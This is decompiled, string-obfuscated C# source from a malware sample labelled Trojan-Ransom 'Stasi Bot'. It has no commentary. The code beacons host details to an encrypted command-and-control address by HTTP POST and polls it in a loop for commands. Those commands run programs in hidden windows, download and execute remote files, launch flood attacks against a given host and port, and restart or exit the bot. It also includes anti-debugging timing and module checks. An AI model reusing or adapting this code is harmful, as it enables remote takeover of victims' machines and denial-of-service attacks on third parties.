// Decompiled with JetBrains decompiler
// Type: ?4?.?6?
// Assembly: Stasi Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5CBE163B-B93A-4B20-A7D0-9D33961B8040
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Ransom.Win32.Blocker.hefc-d761814a3881cda5552583bb55f86ecca16438332641b4ca511b957946e6659b.exe

using \u003F4\u003F;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;

namespace \u003F4\u003F
{
  internal class \u003F6\u003F
  {
    private string \u003F11\u003F = \u003F78\u003F.\u003F79\u003F("\\ŵɶͺѶԻؽܺ࠴िਾ୦\u0C64ൡ\u0E73ཡၮᅤብፒ");
    private string \u003F66\u003F = \u003F78\u003F.\u003F79\u003F("Kıɜ̲аԲ");
    private string \u003F67\u003F = \u003F78\u003F.\u003F79\u003F("MŐɗ͒Лԏذܧ\u082Fल\u0A29ମనശฦ\u0F2Fဥᄺሢጥᐤᔿᙱᝣᡬᥴᨤᭈᱦᵼḧὖ\u2064Ⅺ≦⍮\u242E");
    private string \u003F61\u003F = \u003F78\u003F.\u003F79\u003F("BőȰ");
    private string \u003F62\u003F = \u003F78\u003F.\u003F79\u003F("}Šɦͪѡշتݦ\u087A।");
    public string \u003F68\u003F = \u003F78\u003F.\u003F79\u003F("Cźɼ͵ѿոٽܭࡊॢ੦୬నൊ\u0E67ཫၥᅤቧ\u1373");
    private string \u003F64\u003F = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private \u003F1\u003F \u003F69\u003F = new \u003F1\u003F();
    private \u003F8\u003F.\u003F9\u003F \u003F70\u003F;
    private \u003F10\u003F \u003F71\u003F = new \u003F10\u003F();

    public \u003F6\u003F()
    {
      \u003F3\u003F obj1 = new \u003F3\u003F(this.\u003F64\u003F, this.\u003F62\u003F);
      \u003F7\u003F obj2 = new \u003F7\u003F(this.\u003F68\u003F, Application.ExecutablePath);
      Module module = Assembly.GetExecutingAssembly().GetModules()[0];
      string str1 = this.\u003F64\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F62\u003F;
      if (!obj1.\u003F18\u003F(this.\u003F11\u003F))
        Environment.Exit(0);
      this.\u003F70\u003F = \u003F8\u003F.\u003F32\u003F();
      obj2.\u003F30\u003F();
      this.\u003F21\u003F();
      while (true)
      {
        try
        {
          string str2 = \u003F78\u003F.\u003F79\u003F("aŤɮͬеԵؠݭ\u0873४੦଼") + this.\u003F70\u003F.\u003F74\u003F;
          string str3 = this.\u003F24\u003F(this.\u003F67\u003F + \u003F78\u003F.\u003F79\u003F("XŨɵͱЪճ٪ݱ"), str2);
          if (str3.Length != 0)
            this.\u003F28\u003F(str3);
          else
            this.\u003F28\u003F(\u003F78\u003F.\u003F79\u003F("$ųɢͫѵ"));
        }
        catch
        {
        }
      }
    }

    private void \u003F21\u003F()
    {
      try
      {
        new \u003F3\u003F(this.\u003F64\u003F, this.\u003F62\u003F).\u003F19\u003F();
        string str = \u003F78\u003F.\u003F79\u003F("mųɪͦм") + this.\u003F23\u003F(this.\u003F70\u003F.\u003F74\u003F) + \u003F78\u003F.\u003F79\u003F("*ŦɥͭѭԺطܣ\u086Aॢ\u0A76଼") + (object) this.\u003F70\u003F.\u003F75\u003F + \u003F78\u003F.\u003F79\u003F(".ŷɥͫѥծ٧ܼ") + this.\u003F23\u003F(this.\u003F70\u003F.\u003F76\u003F) + \u003F78\u003F.\u003F79\u003F(".ŰɯͫѲզٰܼ") + this.\u003F23\u003F(this.\u003F70\u003F.\u003F72\u003F) + \u003F78\u003F.\u003F79\u003F("/ūɨͳѫհٱݻ࠼") + this.\u003F23\u003F(this.\u003F70\u003F.\u003F73\u003F) + \u003F78\u003F.\u003F79\u003F("#ŲɦͰм") + this.\u003F23\u003F(this.\u003F61\u003F) + \u003F78\u003F.\u003F79\u003F("#ūɴͬм") + this.\u003F23\u003F(this.\u003F66\u003F);
        this.\u003F24\u003F(this.\u003F67\u003F + \u003F78\u003F.\u003F79\u003F("XŨɵͱЪճ٪ݱ"), str);
      }
      catch
      {
      }
    }

    private string \u003F22\u003F(string _param1, string _param2)
    {
      string str = \u003F78\u003F.\u003F79\u003F("");
      try
      {
        if (!_param1.Contains(\u003F78\u003F.\u003F79\u003F(",") + _param2 + \u003F78\u003F.\u003F79\u003F(";")))
          return (string) null;
        int startIndex = _param1.IndexOf(\u003F78\u003F.\u003F79\u003F(",") + _param2 + \u003F78\u003F.\u003F79\u003F(";")) + (_param2.Length + 2);
        string[] strArray = _param1.Substring(startIndex).Split(' ');
        switch (strArray[0])
        {
          case null:
            return str.Trim();
          default:
            return strArray[0];
        }
      }
      catch
      {
        return (string) null;
      }
    }

    private string \u003F23\u003F(string _param1)
    {
      char[] charArray = HttpUtility.HtmlEncode(_param1).ToCharArray();
      StringBuilder stringBuilder = new StringBuilder(_param1.Length + (int) ((double) _param1.Length * 0.1));
      foreach (char ch in charArray)
      {
        int int32 = Convert.ToInt32(ch);
        if (int32 <= (int) sbyte.MaxValue)
        {
          stringBuilder.Append(ch);
          continue;
        }
        stringBuilder.AppendFormat(\u003F78\u003F.\u003F79\u003F(" Ħɿ̳ѿԺ"), (object) int32);
      }
      return stringBuilder.ToString();
    }

    private string \u003F24\u003F(string _param1, string _param2)
    {
      WebRequest webRequest = WebRequest.Create(_param1);
      webRequest.ContentType = \u003F78\u003F.\u003F79\u003F("@ŐɯͲѴտٺݮ\u0870ॷ\u0A79ହ౭ഹ\u0E64ཥၦᄽቩ፡ᑿᕡᘦ\u177F\u187Bᥤᩢ᭨ᱦᵫṧὧ\u2065");
      webRequest.Method = \u003F78\u003F.\u003F79\u003F("TŌɑ͕");
      byte[] bytes = Encoding.ASCII.GetBytes(_param2);
      webRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = webRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = webRequest.GetResponse();
      return response != null ? new StreamReader(response.GetResponseStream()).ReadToEnd().Trim() : (string) null;
    }

    private bool \u003F25\u003F()
    {
      Random random = new Random();
      try
      {
        int millisecondsTimeout = random.Next(5000, 10000);
        int tickCount = Environment.TickCount;
        Thread.Sleep(millisecondsTimeout);
        return !(tickCount + millisecondsTimeout >= Environment.TickCount - 20 & tickCount + millisecondsTimeout <= Environment.TickCount + 20);
      }
      catch
      {
        return false;
      }
    }

    private bool \u003F26\u003F()
    {
      try
      {
        foreach (ProcessModule module in (ReadOnlyCollectionBase) Process.GetCurrentProcess().Modules)
        {
          if (module.ModuleName == \u003F78\u003F.\u003F79\u003F("XŨɠͭуժ٩ܪ\u0867८੭"))
            return true;
        }
        return false;
      }
      catch
      {
        return false;
      }
    }

    private void \u003F27\u003F(string _param1, bool _param2) => Process.Start(new ProcessStartInfo(_param1)
    {
      WindowStyle = !_param2 ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal
    });

    private void \u003F28\u003F(string _param1)
    {
      try
      {
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("$ųɢͫѵ")))
          Thread.Sleep(60000);
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("(ŧɷͣѫշ٪ݶ\u0864")))
        {
          string str = this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("wŪɶͤ"));
          bool boolean = Convert.ToBoolean(Convert.ToInt32(this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("wūɭͶ"))));
          switch (str)
          {
            case null:
              break;
            default:
              this.\u003F27\u003F(str, boolean);
              break;
          }
        }
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("'Ųɡ͡Ѧխ")))
        {
          string address = this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("bŪɮͤ"));
          string str = this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("`Ŧɱ͵"));
          string arguments = this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("`ŭɬ"));
          bool boolean = Convert.ToBoolean(Convert.ToInt32(this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("vŰɢͰѵ"))));
          if (address != null & str != null)
          {
            string fileName = \u003F6\u003F.\u003F29\u003F(str);
            new WebClient().DownloadFile(address, fileName);
            if (boolean)
              Process.Start(new ProcessStartInfo(fileName, arguments));
          }
        }
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("+šɼͳѶգ٨ݬ\u086D॥")))
        {
          string str = this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("pţɧͷѪն٤"));
          int int32_1 = Convert.ToInt32(this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("jŬɵ")));
          int int32_2 = Convert.ToInt32(this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("sŮɷ͡Ѣզٲ")));
          if (str != null & int32_1 != 0)
          {
            if (this.\u003F69\u003F.\u003F63\u003F)
              this.\u003F69\u003F.\u003F16\u003F();
            if (this.\u003F71\u003F.\u003F63\u003F)
              this.\u003F71\u003F.\u003F38\u003F();
            this.\u003F69\u003F.\u003F40\u003F = str;
            this.\u003F69\u003F.\u003F41\u003F = int32_1;
            this.\u003F69\u003F.\u003F65\u003F = int32_2;
            this.\u003F69\u003F.\u003F15\u003F();
          }
        }
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F(",ſɿͥѹջٲݶ\u0860ॶੰ\u0B7B౯")) && this.\u003F71\u003F.\u003F63\u003F)
          this.\u003F71\u003F.\u003F38\u003F();
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("&ŴɠͥѶն٩")))
          this.\u003F21\u003F();
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("+źɼͨѶգ٨ݬ\u086D॥")))
        {
          if (this.\u003F69\u003F.\u003F63\u003F)
            this.\u003F69\u003F.\u003F16\u003F();
          if (this.\u003F71\u003F.\u003F63\u003F)
            this.\u003F71\u003F.\u003F38\u003F();
        }
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("(ŻɲͶѠնٰݻ\u086F")))
        {
          string str = this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("lŬɱ͵"));
          int int32_3 = Convert.ToInt32(this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("tŬɰ͵")));
          int int32_4 = Convert.ToInt32(this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("sŮɷ͡Ѣզٲ")));
          int int32_5 = Convert.ToInt32(this.\u003F22\u003F(_param1, \u003F78\u003F.\u003F79\u003F("tũɦͯѦնٲ")));
          if (str != null & int32_3 != 0)
          {
            if (this.\u003F69\u003F.\u003F63\u003F)
              this.\u003F69\u003F.\u003F16\u003F();
            if (this.\u003F71\u003F.\u003F63\u003F)
              this.\u003F71\u003F.\u003F38\u003F();
            this.\u003F71\u003F.\u003F40\u003F = str;
            this.\u003F71\u003F.\u003F77\u003F = int32_3;
            this.\u003F71\u003F.\u003F59\u003F = int32_5;
            this.\u003F71\u003F.\u003F65\u003F = int32_4;
            this.\u003F71\u003F.\u003F37\u003F();
          }
        }
        if (_param1.StartsWith(\u003F78\u003F.\u003F79\u003F("'Ŧɨͬѱդ")))
          Environment.Exit(0);
        if (!_param1.StartsWith(\u003F78\u003F.\u003F79\u003F(")ŵɣͶѰբٰݵ")))
          return;
        Application.Restart();
        Environment.Exit(0);
      }
      catch
      {
      }
    }

    private static string \u003F29\u003F(string _param0)
    {
      try
      {
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("+őɿ;ѡե٨ݫ\u087Dॡ੨୨ు\u0D65\u0E77ལျ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("-ŕɺ\u0379Ѿսٿݑ\u087Fॾ\u0A61\u0B65౨൫\u0E7Dཡၨᅨቁ፥ᑷᕣᘻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F(".Őɽͼѽ\u0560٠ݝ\u087E।੭\u0B7B౩൪เཬၨᅦቱጻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("3ŋɨͩѮխ٦ݱ࠻")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("3Ōɢ͵Ѯհ٬ݲ࠻")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("(ŕɵͼѥչ٣ݻࡎॠ\u0A7Aୢ\u0C65\u0D71\u0E6Bཱၻᄻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("1Ōɨ;Ѩմ٬ݰ\u0866ॱ\u0A3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("3ŀɮ͵ѱիٱݻ࠻")))
          return Environment.GetFolderPath(Environment.SpecialFolder.History) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("5Ňɣ\u0378Ѯո٧ݭ\u0873ॅ\u0A64୧౫൧\u0E3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F(",řɻͰѳսّݿ\u087Eॡ\u0A65୨౫ൽ\u0E61ཨၨᅁብ\u1377ᑣᔻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("6ņɳ͊ѧժٶݰ\u0870०ੰ\u0B3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.MyComputer) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("7Łɲ͎Ѧիٲݫ\u0860४\u0A77ୱ\u0C3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Personal) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("3Ņɾ͋Ѱշ٪ݡ࠻")))
          return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("6ņɳ͙ѡդٲݰ\u0876०ੱ\u0B3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("0řɭ͵ѵժ٪ݢ\u086Eऻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Personal) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("4ŝɾͤѭջ٩ݪࡀ६੨୦\u0C71\u0D3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("0řɺͨѡշ٥ݮ\u0871ऻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Programs) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("2ŕɣͦѡխٶܻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Recent) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("2ŔɣͫѠ\u0557٭ܻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.SendTo) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("1řɽͩѵղوݡ\u086Dॷ\u0A3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("3śɳͧѷհٶݲ࠻")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Startup) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("2ŔɿͶѰզٯܻ")))
          return Environment.GetFolderPath(Environment.SpecialFolder.System) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("1Şɬͥѷժ٤ݰ\u0866ॱ\u0A3B")))
          return Environment.GetFolderPath(Environment.SpecialFolder.Templates) + _param0.Split(':')[2].Trim();
        if (_param0.Contains(\u003F78\u003F.\u003F79\u003F("4ŎɣͦѺռټݢ\u0874ो\u0A65୮౧\u0D3B")))
          return Environment.MachineName;
        return _param0.Contains(\u003F78\u003F.\u003F79\u003F("0Ŝɻ͢ѴՋ٥ݮ\u0867ऻ")) ? Environment.UserName : _param0;
      }
      catch
      {
        return _param0;
      }
    }
  }
}
